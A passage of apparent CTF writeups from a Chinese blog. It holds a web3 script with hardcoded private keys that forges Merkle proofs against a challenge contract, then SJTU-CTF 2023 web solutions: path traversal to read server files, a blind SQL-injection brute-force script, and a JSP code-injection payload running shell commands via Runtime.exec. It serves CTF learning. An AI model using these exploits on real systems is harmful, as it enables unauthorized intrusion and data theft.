class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> binary[:k+<span class=\"number\">1</span>] == <span class=\"string\">&#x27;0&#x27;</span>*k+<span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(k,binary[:<span class=\"number\">5</span>],hackers[i],sk_hackers[i])</span><br><span class=\"line\">                find.append(k)</span><br><span class=\"line\"><span class=\"comment\">#findHacker()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">hackers = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">hackers[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x1424021b77400221b9E86422571F76bF50acd44c&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x45AD33c37e5029804794f390cB2474349F2aDf12&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sk_hackers = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)]</span><br><span class=\"line\">sk_hackers[<span class=\"number\">0</span>] = <span class=\"string\">b&quot;\\xef\\x1a\\xfa\\x87\\xde\\xb0\\x82\\xd4e\\x83\\x8c\\x1dR\\x8d.\\xfdyq\\xcaX\\x16\\x9f\\x1bZ\\xfe\\xbe:\\x8c\\xcf&#x27;Y\\xbc&quot;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">1</span>] = <span class=\"string\">b&#x27;2\\xc3\\x99\\x97\\xc5\\\\\\xe6^\\xc8\\x8eKQ\\xb3\\x93\\xba(\\x06\\x9e%Npd\\x8b\\xdf\\x88\\x82\\xdc\\x9c\\xe8\\x99P\\xf1&#x27;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">2</span>] = <span class=\"string\">b&#x27;.\\x8d-\\x17W\\xe27\\xc1\\xb9 \\x9ax\\xb3A\\x0eC\\xfe\\x00\\x87\\xc4&#125;v.9\\xa6g\\x96d\\xd7c,\\xcf&#x27;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">3</span>] = <span class=\"string\">b&#x27;^Y$eKx\\x1f72\\x07\\xd9\\x98F\\x0c3\\x92N\\x01+\\xc0J\\xc7\\x1c\\xa5Bq\\x8bhC\\xef)T&#x27;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">4</span>] = <span class=\"string\">b&quot;\\xa5\\x13&#x27;\\xfc\\xa8\\xbe\\xd2\\x94J\\xb7\\xc6wH:\\xbb\\xc5\\x8c\\x8d\\xbf\\xba\\xbdG.\\xa9=\\x89)\\x8e\\xe5\\xea\\x12\\xcb&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#getMoney(hackers[4])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#getAccount()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_sig</span>(<span class=\"params\">func: <span class=\"built_in\">bytes</span></span>) -&gt; <span class=\"built_in\">bytes</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(func, <span class=\"built_in\">str</span>):</span><br><span class=\"line\">        func = func.encode()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> keccak(func)[:<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_txn</span>(<span class=\"params\">src, dst, data, value=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;chainId&quot;</span>: w3.eth.chain_id,</span><br><span class=\"line\">        <span class=\"string\">&quot;from&quot;</span>: src,</span><br><span class=\"line\">        <span class=\"string\">&quot;to&quot;</span>: dst,</span><br><span class=\"line\">        <span class=\"string\">&quot;gasPrice&quot;</span>: w3.toWei(<span class=\"number\">1</span>,<span class=\"string\">&#x27;gwei&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;gas&quot;</span>: <span class=\"number\">0x321850</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;value&quot;</span>: w3.toWei(value,<span class=\"string\">&#x27;wei&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(src),</span><br><span class=\"line\">        <span class=\"string\">&quot;data&quot;</span>: data</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">send_tx</span>(<span class=\"params\">signed_txn, send: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> send <span class=\"keyword\">or</span> ONE_SHOT_MODE:</span><br><span class=\"line\">        txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).<span class=\"built_in\">hex</span>()</span><br><span class=\"line\">        txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> txn_receipt[<span class=\"string\">&#x27;status&#x27;</span>] == <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">send_hacker_tx</span>(<span class=\"params\">hacker,target,data,sk_hacker</span>):</span><br><span class=\"line\">    <span class=\"comment\">#通过hacker调用target的data函数</span></span><br><span class=\"line\">    signed_txn = w3.eth.account.signTransaction(get_txn(hacker, target, data), sk_hacker)</span><br><span class=\"line\">    send_tx(signed_txn)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter</span>(<span class=\"params\">proof</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;enter(bytes32[])&#x27;</span>) + encode_abi([<span class=\"string\">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pickupTreasureChest_sig</span>(<span class=\"params\">proof</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;pickupTreasureChest(bytes32[])&#x27;</span>) + encode_abi([<span class=\"string\">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findKey_sig</span>(<span class=\"params\">proof</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;findKey(bytes32[])&#x27;</span>) + encode_abi([<span class=\"string\">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">openTreasureChest_sig</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;openTreasureChest()&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getProof</span>(<span class=\"params\">b1,b2,h</span>):</span><br><span class=\"line\">    proof = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = h</span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = b1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = b2</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> proof</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter1</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter2</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">1</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">1</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x799d6ded98975eb22e289ea90ff6f3f327537299ab8325e695c61d31ee711c56&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 根据顺序调整height </span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000002&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter3</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">2</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">2</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xcc2f18436e39156aa78964ff9e33acb4778bfd7a3182a20a5e86e2578a2dd334&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter4</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">3</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">3</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x68ee889a32ce609fc0acbf31dd1cc40b522d2c1fcabc0b0d5d2cd66cde478338&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter5</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">4</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">4</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pickupTreasureChest</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 先做这个 根据递增的要求构造出5个地址 记录merge的顺序</span></span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = c1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">        </span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,pickupTreasureChest_sig(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findKey</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xbccd02410d2e51fe9783b9597d341834148ebbfd545ad02023fcf29e54ffc35e&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = c1</span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">        </span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,findKey_sig(proof),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">openTreasureChest</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    send_hacker_tx(hacker,final_target,openTreasureChest_sig(),sk_hacker)</span><br><span class=\"line\">    check(final_target)</span><br><span class=\"line\">openTreasureChest()</span><br></pre></td></tr></table></figure>","categories":["ctf"]},{"title":"SJTU-CTF 2023 Writeup","url":"/2024/01/22/ctf/SJTU-CTF%202023%20Writeup/","content":"<h1 id=\"SJTU-CTF-2023-Writeup\"><a href=\"#SJTU-CTF-2023-Writeup\" class=\"headerlink\" title=\"SJTU-CTF 2023 Writeup\"></a>SJTU-CTF 2023 Writeup</h1><p>[TOC]</p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"flag-gallery\"><a href=\"#flag-gallery\" class=\"headerlink\" title=\"flag gallery\"></a>flag gallery</h3><p>F12看网络 可以看到请求了getflag.php?flag&#x3D;<br>尝试改参数，发现可以读其他文件 并且没有限制路径，但是根目录的flag没有权限<br><a href=\"http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php\">http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php</a><br>可以看到给了密码的md5哈希 最早以为这个没法碰撞，想别的思路了 比如提权 后来发现可以直接用<a href=\"https://www.somd5.com/\">https://www.somd5.com/</a> 找到密码是sjtuctf</p>\n<h3 id=\"Mimic-SQL\"><a href=\"#Mimic-SQL\" class=\"headerlink\" title=\"Mimic SQL\"></a>Mimic SQL</h3><p><code>select * from article where id=(select id from flag where flag like &#39;0%&#39;)</code> 可以根据查询到结果与否逐个爆破flag的每个字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">t</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Hello&#x27;</span> <span class=\"keyword\">in</span> t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0ops&#123;65BDC40EC5FF286E2E0B3C71BF3247D8&#125;</span></span><br><span class=\"line\">base = <span class=\"string\">&quot;http://8d5affacfc024519894c9d2345f17bdf.penguin.0ops.sjtu.cn:8080/article?id=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag_c = <span class=\"string\">&#x27;0ops&#123;&#x27;</span></span><br><span class=\"line\">real_flag = flag_c</span><br><span class=\"line\">flag = flag_c</span><br><span class=\"line\">find = <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"keyword\">not</span> find:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(c) <span class=\"keyword\">in</span> <span class=\"string\">&#x27;_%&#x27;</span>:</span><br><span class=\"line\">            flag = flag_c + <span class=\"string\">f&quot;[<span class=\"subst\">&#123;<span class=\"built_in\">chr</span>(c)&#125;</span>]&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flag = flag_c + <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\">        </span><br><span class=\"line\">        query = <span class=\"string\">f&quot;(select id from flag where flag like &#x27;<span class=\"subst\">&#123;flag&#125;</span>%&#x27;)&quot;</span></span><br><span class=\"line\">        <span class=\"comment\">#print(query)</span></span><br><span class=\"line\">        res = requests.get(base+urllib.parse.quote(query))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check(res.text):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(c)==<span class=\"string\">&#x27;&#125;&#x27;</span>:</span><br><span class=\"line\">                find = <span class=\"literal\">True</span></span><br><span class=\"line\">            flag_c = flag</span><br><span class=\"line\">            real_flag = flag_c + <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag_c)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"built_in\">print</span>(real_flag.lower())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"ezjsp\"><a href=\"#ezjsp\" class=\"headerlink\" title=\"ezjsp\"></a>ezjsp</h3><p>刚开始以为嵌入代码的标签都被过滤了 只能用el表达式 参考了这篇文章<br><a href=\"https://blog.csdn.net/qq_43147039/article/details/116885802\">一次jsp上传绕过的思考 –yzddMr6_yzddMr6的博客-CSDN博客</a><br>尝试用[‘’]绕过. 用反射代替new等<br>后来偶然发现竟然可以直接用&lt;%%&gt;注入java代码 不会被过滤 .也不会</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">    out.println(Runtime.getRuntime().exec(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;/bin/bash&quot;</span>,<span class=\"string\">&quot;-c&quot;</span>,<span class=\"string\">&quot;/readflag &gt; /usr/local/tomcat/webapps/ROOT/upload/flag.txt&quot;</span>&#125;).waitFor());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.jb51.net/article/227181.htm#_lab2_1_2\">调用java.lang.Runtime.exec的正确姿势分享_java_脚本之家 (jb51.net)</a><br><a href=\"https://blog.csdn.net/dingding_ting/article/details/121215718\">Process.waitFor()方法的返回值_永远不要矫情的博客-CSDN博客</a><br>返回0表示执行成功，然后用url读返回的地址即可拿到flag</p>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h2><h3 id=\"简单的RPG1\"><a href=\"#简单的RPG1\" class=\"headerlink\" title=\"简单的RPG1\"></a>简单的RPG1</h3><p>简单模拟 异或可以反推</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> paramiko</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">b</span>():</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">stage1key=[<span class=\"number\">157</span>, <span class=\"number\">212</span>, <span class=\"number\">213</span>, <span class=\"number\">134</span>, <span class=\"number\">249</span>, <span class=\"number\">234</span>, <span class=\"number\">171</span>, <span class=\"number\">226</span>, <span class=\"number\">140</span>, <span class=\"number\">204</span>, <span class=\"number\">135</span>, <span class=\"number\">167</span>, <span class=\"number\">241</span>, <span class=\"number\">168</span>, <span class=\"number\">188</span>, <span class=\"number\">26</span>, <span class=\"number\">77</span>, <span class=\"number\">92</span>, <span class=\"number\">63</span>, <span 